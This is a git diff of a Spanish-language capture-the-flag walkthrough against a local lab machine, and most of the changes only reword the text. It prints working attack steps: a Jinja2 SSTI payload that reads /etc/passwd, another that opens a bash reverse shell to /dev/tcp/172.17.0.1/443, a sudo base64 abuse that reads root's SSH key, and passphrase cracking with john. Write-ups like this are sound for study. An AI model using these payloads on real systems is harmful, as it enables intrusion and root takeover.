@@ -56,6 +56,8 @@ PORT     STATE SERVICE REASON         VERSION
 8089/tcp open  unknown syn-ack ttl 64
 ```
 
+Tenemos la siguiente informacion:
+
 - Puerto 22 SSH OpenSSH 9.2p1 Debian 2+deb12u2
 - Puerto 80 HTTP Apache httpd 2.4.59
 - Puerto 8089: Servicio desconocido
@@ -68,18 +70,23 @@ La página principal muestra la página por defecto de Apache2 sin contenido rel
 
 ### Puerto 8089
 
-Al acceder al puerto 8089 desde el navegador encuentro una aplicación web. Utilizo `whatweb` para identificar las tecnologías.
+Al acceder al puerto 8089 desde el navegador encuentro una aplicación web. 
+
+Utilizo `whatweb` para identificar las tecnologías.
+
+- La aplicación corre con **Python 3.11.2** y **Werkzeug 2.2.2** (framework Flask).
+
 
 ```bash
 > whatweb http://172.17.0.2:8089/
 http://172.17.0.2:8089/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Title[Dale duro bro], Werkzeug[2.2.2]
 ```
 
-- La aplicación corre con **Python 3.11.2** y **Werkzeug 2.2.2** (framework Flask).
+La aplicacion tiene solo un input:
 
 ![](assets/Pasted%20image%2020251110165559.png)
 
-Probando la aplicación noto que el input del usuario se refleja en la página. El parámetro `?user=` también se refleja en la respuesta.
+Probando la aplicación noto que el input del usuario se refleja en la página. El parámetro `?user=` también se refleja en la pagina.
 
 ![](assets/Pasted%20image%2020251110165824.png)
 
@@ -89,7 +96,9 @@ Sabiendo que la aplicación corre en Python y que el input del usuario se reflej
 
 ### Server-Side Template Injection (SSTI)
 
-Pruebo con una operación matemática simple para confirmar si la aplicación interpreta expresiones de plantilla.
+Para probar el SSTI pruebo con una operación matemática simple para confirmar si la aplicación interpreta expresiones de plantilla.
+
+En el input coloco:
 
 ```
 {{7*7}}
@@ -97,11 +106,13 @@ Pruebo con una operación matemática simple para confirmar si la aplicación in
 
 ![](assets/Pasted%20image%2020251110170230.png)
 
-La aplicación evalúa la expresión y devuelve `49`, confirmando la vulnerabilidad SSTI.
+- La aplicación evalúa la expresión y devuelve `49`, confirmando la vulnerabilidad SSTI.
 
 ### Lectura de Archivos con SSTI
 
-Busco payloads para Jinja2 que permitan leer archivos del sistema. Utilizo el siguiente payload para leer `/etc/passwd`.
+Ahora que se que la web es vulnerable a SSTI puedo buscar payloads para Jinja2 que me permitan leer archivos del sistema. 
+
+- Voy a utilizar el siguiente payload para leer el `/etc/passwd`:
 
 ```python
 > {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
@@ -109,11 +120,13 @@ Busco payloads para Jinja2 que permitan leer archivos del sistema. Utilizo el si
 
 ![](assets/Pasted%20image%2020251110170620.png)
 
-- Descubro un usuario llamado `verde`
+- El `/etc/passwd` muestra que existe un usuario llamado `verde`
 
 ### Reverse Shell mediante SSTI
 
-Busco un payload que me permita ejecutar comandos y establecer una reverse shell.
+SSTI tambien me va a permitr ejecutar comandos, por lo cual voy a buscar algun payload.
+
+- Voy a utilizar este payload para entablarme una reverse-shell.
 
 ```bash
 > {{ self.__init__.__globals__.__builtins__.__import__('subprocess').Popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"', shell=True) }}
@@ -121,14 +134,14 @@ Busco un payload que me permita ejecutar comandos y establecer una reverse shell
 
 ![](assets/Pasted%20image%2020251110171843.png)
 
-Me pongo en escucha en mi máquina atacante.
+Primero me tengo quee poner en escucha en mi máquina atacante.
 
 ```bash
 > sudo nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-Ejecuto el payload y obtengo acceso al sistema.
+y ahora puedo ejecutar el payload en la web para tener conexion:
 
 ```bash
 Connection received on 172.17.0.2 45678
@@ -152,7 +165,9 @@ User verde may run the following commands on d56c80ae05a3:
 
 ### Lectura de Clave SSH de Root
 
-Durante el reconocimiento descubrimos que el puerto 22 (SSH) está abierto. Es posible que el usuario root tenga una clave SSH privada. Puedo leerla aprovechando el binario `base64`.
+Durante el reconocimiento descubrimos que el puerto 22 (SSH) está abierto por lo cual es posible que el usuario root tenga una clave SSH privada. 
+
+- Puedo tratar de leer esta clave abusando del binario `base64` para codificarla y descodificarla:
 
 ```bash
 > sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 -d
@@ -163,7 +178,7 @@ VRdf31TPoa0wcuFMcqXJhxfX9HqhmcePAyZMxtgChQzYmmzRgkYH6jBTXSnNanTe4A0KME
 ...
 ```
 
-Guardo la clave en mi sistema y ajusto los permisos.
+Ahora voy a guardar la clave en mi sistema y ajustar los permisos para poder usarla.
 
 ```bash
 > chmod 600 root-key
@@ -171,11 +186,11 @@ Guardo la clave en mi sistema y ajusto los permisos.
 Enter passphrase for key 'root-key':
 ```
 
-La clave SSH está protegida con contraseña.
+- Al tratar de usar la clave me pide contraseña
 
 ### Cracking de la Contraseña SSH
 
-Utilizo `ssh2john` para extraer el hash y `john` para crackearlo.
+Puedo crackear la contraseña utilizando `ssh2john` para extraer el hash crackeable y crackaer dicho hash con `john`: 
 
 ```bash
 > ssh2john root-key > hash
@@ -188,7 +203,7 @@ root-key:honda1
 
 - Contraseña encontrada: `honda1`
 
-Me conecto por SSH con la clave privada y la contraseña.
+Ahora si puedo conectarme por SSH con la clave privada y la contraseña.
 
 ```bash
 > ssh -i root-key root@172.17.0.2
